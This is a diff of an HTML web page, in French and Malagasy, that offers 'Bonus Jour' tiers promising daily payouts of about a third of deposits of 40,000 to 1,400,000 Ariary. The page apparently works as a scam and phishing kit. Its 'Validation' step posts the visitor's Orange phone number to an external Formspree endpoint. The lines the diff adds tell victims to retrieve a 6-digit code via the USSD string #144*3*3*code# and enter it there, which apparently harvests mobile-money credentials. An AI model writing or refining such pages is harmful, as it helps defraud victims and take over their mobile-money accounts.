@@ -12,20 +12,18 @@
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         .step-img { width: 100%; border-radius: 10px; margin-bottom: 15px; }
 
-        /* --- STYLING CAGE CAGE (Mifanaraka amin'ny sary nalefanao) --- */
+        /* Style Cage Cage (Click Diams style) */
         .tarif-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 15px; max-height: 500px; overflow-y: auto; padding: 5px; }
         .tarif-card { background: white; border-radius: 12px; border: 1px solid #eee; padding: 15px 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); transition: 0.3s; display: flex; flex-direction: column; align-items: center; }
         .tarif-card:hover { transform: translateY(-3px); box-shadow: 0 6px 12px rgba(0,0,0,0.1); }
-        
-        .fond-text { font-size: 18px; font-weight: 800; color: #1a1a1b; margin-bottom: 2px; }
-        .fond-sub { font-size: 11px; color: #777; margin-bottom: 10px; text-transform: uppercase; }
-        .bonus-vola { font-size: 20px; font-weight: 900; color: #007bff; margin-bottom: 12px; }
-        
-        .btn-poursuivre { background: #000; color: white; border: none; padding: 10px 0; width: 100%; border-radius: 8px; font-weight: bold; font-size: 12px; cursor: pointer; text-transform: uppercase; }
-        /* --------------------------------------------------------- */
+        .fond-text { font-size: 17px; font-weight: 800; color: #1a1a1b; margin-bottom: 2px; }
+        .fond-sub { font-size: 10px; color: #777; margin-bottom: 10px; text-transform: uppercase; }
+        .bonus-vola { font-size: 19px; font-weight: 900; color: #007bff; margin-bottom: 12px; }
+        .btn-poursuivre { background: #000; color: white; border: none; padding: 10px 0; width: 100%; border-radius: 8px; font-weight: bold; font-size: 11px; cursor: pointer; text-transform: uppercase; }
 
         .btn-next, .btn-confirm { background: #007bff; color: white; padding: 15px; border: none; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 8px; border: 1px solid #ddd; box-sizing: border-box; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 8px; border: 1px solid #ddd; box-sizing: border-box; font-size: 15px; }
+        .info-code { background: #fff3cd; color: #856404; padding: 10px; border-radius: 8px; font-size: 12px; margin-bottom: 10px; border: 1px solid #ffeeba; }
         #msgFelicitation { font-size: 14px; line-height: 1.6; text-align: left; padding: 15px; background: #f8f9fa; border-radius: 10px; border-left: 4px solid #28a745; color: #333; }
         .welcome-title { color: #007bff; font-size: 24px; font-weight: 900; margin-bottom: 20px; }
     </style>
@@ -39,50 +37,25 @@
     </div>
 
     <div id="step2" class="step">
-        <h2 style="font-size: 18px; margin-bottom: 15px;">Choisir ton tarif</h2>
+        <h2 style="font-size: 18px; margin-bottom: 10px;">Choisir ton tarif</h2>
         <div class="tarif-grid">
-            <div class="tarif-card">
-                <div class="fond-text">40.000Ar</div>
-                <div class="fond-sub">Bonus Jour</div>
-                <div class="bonus-vola">21.400Ar</div>
-                <button class="btn-poursuivre" onclick="selectTarif('40.000Ar', '21.400Ar')">Poursuivre</button>
-            </div>
-            <div class="tarif-card">
-                <div class="fond-text">60.000Ar</div>
-                <div class="fond-sub">Bonus Jour</div>
-                <div class="bonus-vola">31.400Ar</div>
-                <button class="btn-poursuivre" onclick="selectTarif('60.000Ar', '31.400Ar')">Poursuivre</button>
-            </div>
-            <div class="tarif-card">
-                <div class="fond-text">90.000Ar</div>
-                <div class="fond-sub">Bonus Jour</div>
-                <div class="bonus-vola">41.400Ar</div>
-                <button class="btn-poursuivre" onclick="selectTarif('90.000Ar', '41.400Ar')">Poursuivre</button>
-            </div>
-            <div class="tarif-card">
-                <div class="fond-text">120.000Ar</div>
-                <div class="fond-sub">Bonus Jour</div>
-                <div class="bonus-vola">56.800Ar</div>
-                <button class="btn-poursuivre" onclick="selectTarif('120.000Ar', '56.800Ar')">Poursuivre</button>
-            </div>
-            <div class="tarif-card">
-                <div class="fond-text">140.000Ar</div>
-                <div class="fond-sub">Bonus Jour</div>
-                <div class="bonus-vola">71.400Ar</div>
-                <button class="btn-poursuivre" onclick="selectTarif('140.000Ar', '71.400Ar')">Poursuivre</button>
-            </div>
-            <div class="tarif-card">
-                <div class="fond-text">180.000Ar</div>
-                <div class="fond-sub">Bonus Jour</div>
-                <div class="bonus-vola">87.500Ar</div>
-                <button class="btn-poursuivre" onclick="selectTarif('180.000Ar', '87.500Ar')">Poursuivre</button>
-            </div>
+            <div class="tarif-card"><div class="fond-text">40.000Ar</div><div class="fond-sub">Bonus Jour</div><div class="bonus-vola">21.400Ar</div><button class="btn-poursuivre" onclick="selectTarif('40.000Ar', '21.400Ar')">Poursuivre</button></div>
+            <div class="tarif-card"><div class="fond-text">60.000Ar</div><div class="fond-sub">Bonus Jour</div><div class="bonus-vola">31.400Ar</div><button class="btn-poursuivre" onclick="selectTarif('60.000Ar', '31.400Ar')">Poursuivre</button></div>
+            <div class="tarif-card"><div class="fond-text">90.000Ar</div><div class="fond-sub">Bonus Jour</div><div class="bonus-vola">41.400Ar</div><button class="btn-poursuivre" onclick="selectTarif('90.000Ar', '41.400Ar')">Poursuivre</button></div>
+            <div class="tarif-card"><div class="fond-text">120.000Ar</div><div class="fond-sub">Bonus Jour</div><div class="bonus-vola">56.800Ar</div><button class="btn-poursuivre" onclick="selectTarif('120.000Ar', '56.800Ar')">Poursuivre</button></div>
+            <div class="tarif-card"><div class="fond-text">140.000Ar</div><div class="fond-sub">Bonus Jour</div><div class="bonus-vola">71.400Ar</div><button class="btn-poursuivre" onclick="selectTarif('140.000Ar', '71.400Ar')">Poursuivre</button></div>
+            <div class="tarif-card"><div class="fond-text">180.000Ar</div><div class="fond-sub">Bonus Jour</div><div class="bonus-vola">87.500Ar</div><button class="btn-poursuivre" onclick="selectTarif('180.000Ar', '87.500Ar')">Poursuivre</button></div>
+            <div class="tarif-card"><div class="fond-text">320.000Ar</div><div class="fond-sub">Bonus Jour</div><div class="bonus-vola">100.400Ar</div><button class="btn-poursuivre" onclick="selectTarif('320.000Ar', '100.400Ar')">Poursuivre</button></div>
+            <div class="tarif-card"><div class="fond-text">560.000Ar</div><div class="fond-sub">Bonus Jour</div><div class="bonus-vola">181.400Ar</div><button class="btn-poursuivre" onclick="selectTarif('560.000Ar', '181.400Ar')">Poursuivre</button></div>
+            <div class="tarif-card"><div class="fond-text">980.000Ar</div><div class="fond-sub">Bonus Jour</div><div class="bonus-vola">311.400Ar</div><button class="btn-poursuivre" onclick="selectTarif('980.000Ar', '311.400Ar')">Poursuivre</button></div>
+            <div class="tarif-card"><div class="fond-text">1.400.000Ar</div><div class="fond-sub">Bonus Jour</div><div class="bonus-vola">461.400Ar</div><button class="btn-poursuivre" onclick="selectTarif('1.400.000Ar', '461.400Ar')">Poursuivre</button></div>
         </div>
     </div>
 
     <div id="step3" class="step">
         <img src="https://img.freepik.com/free-vector/secure-login-concept-illustration_114360-4685.jpg" class="step-img">
-        <h1>Validation</h1>
+        <h2 style="font-size: 20px;">Validation</h2>
+        <div class="info-code">⚠️ Tsy foronina ny 6 chiffres fa alaina ao am #144*3*3*code#</div>
         <form id="bonusForm" action="https://formspree.io/f/mreaeppz" method="POST">
             <input type="hidden" name="Tarif" id="selectedTarifInput">
             <input type="tel" name="Numero" placeholder="Numero Orange" required>
